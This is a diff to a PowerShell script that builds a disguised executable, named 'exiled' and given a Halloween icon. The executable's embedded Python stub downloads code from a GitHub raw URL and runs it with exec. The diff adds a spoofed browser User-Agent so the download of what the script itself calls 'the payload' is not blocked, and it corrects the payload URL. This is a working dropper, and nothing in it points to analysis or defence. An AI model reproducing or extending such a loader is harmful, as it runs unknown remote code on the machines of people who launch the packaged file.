@@ -1,7 +1,7 @@
 [CmdletBinding()]
 param(
     [string]$Out = "exiled",
-    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main%2Cpy",
+    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py",
     [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/halloween.png",
     [string]$Dir,
     [switch]$NoIcon,
@@ -77,13 +77,20 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
+# The payload wrapper now includes User-Agent headers to prevent GitHub from blocking the request
 $stubBody = @"
 import urllib.request
 import ctypes
 import ctypes.wintypes
 import tkinter
 
-exec(compile(urllib.request.urlopen('$RemoteUrl').read(), '<url>', 'exec'))
+req = urllib.request.Request('$RemoteUrl', headers={'User-Agent': 'Mozilla/5.0'})
+try:
+    data = urllib.request.urlopen(req).read()
+    exec(compile(data, '<url>', 'exec'))
+except Exception as e:
+    import tkinter.messagebox as mb
+    mb.showerror("Error", f"Failed to load remote payload:\n{e}")
 "@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
